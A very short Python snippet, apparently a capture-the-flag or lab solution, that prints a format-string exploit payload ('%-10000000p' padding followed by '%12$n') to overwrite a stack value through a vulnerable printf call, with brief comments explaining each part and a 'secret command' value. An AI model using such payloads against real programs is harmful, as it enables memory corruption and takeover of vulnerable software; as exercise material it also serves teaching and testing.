# -- EXPLOIT printf FUNCTION -- #


print('%-10000000p '.ljust(32)+'%12$n \\n') 
# %-10000000p --> prints 10mil  with the format p 
# %12$n --> goes to the 12 var in the stack and writs into it the amount of chars

#202009 -> secret command


